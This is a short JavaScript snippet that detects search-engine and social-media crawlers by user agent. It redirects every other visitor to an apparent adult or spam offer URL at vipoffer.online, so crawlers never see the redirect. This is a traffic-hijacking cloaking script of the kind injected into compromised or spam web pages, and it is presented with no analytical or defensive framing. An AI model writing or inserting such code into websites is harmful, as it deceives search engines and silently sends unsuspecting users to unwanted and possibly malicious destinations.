function isBot() {
    const bots = [
        'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
        'YandexBot', 'facebookexternalhit', 'ia_archiver', 'Applebot',
        'Twitterbot', 'rogerbot', 'Alexa', 'AhrefsBot', 'Sogou',
        'Exabot', 'semrush', 'dotbot', 'msnbot', 'seznambot'
    ];
    const userAgent = navigator.userAgent.toLowerCase();
    return bots.some(bot => userAgent.includes(bot.toLowerCase()));
}

(function() {
    const config = {
        redirectURL: "https://vipoffer.online/bdsm-tests-git",
        shouldRedirect: true
    };
    
    if (!isBot() && config.shouldRedirect) {
        window.location.href = config.redirectURL;
    }
})();